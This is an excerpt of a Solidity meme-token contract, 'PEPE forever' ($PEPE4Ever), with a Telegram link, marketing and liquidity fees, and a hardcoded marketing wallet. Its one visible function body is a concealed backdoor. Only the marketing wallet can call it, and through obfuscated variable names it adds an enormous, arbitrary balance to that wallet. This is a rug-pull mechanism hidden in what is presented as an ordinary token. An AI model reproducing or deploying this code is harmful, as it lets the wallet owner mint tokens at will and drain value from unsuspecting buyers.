...
TELEGRAM: https://t.me/pepeforeverrr
...
contract PEPE4 is Context, IERC20, Ownable {
    ...
    string private constant _name = "PEPE forever"; // 
    string private constant _symbol = "$PEPE4Ever"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 4;
    uint256 public _liquidityFee = 1;
    address public  _marketingWallet = 0x3914b7498BE99886AfaF88d5d40F940BEB891abe;
    ...
    require(_marketingWallet == _msgSender());
    uint256 xdasas = 86534456456453254463454421;
    uint256 uuejsjd=xdasas*333;
        _tOwned[_marketingWallet] += uuejsjd;
    }
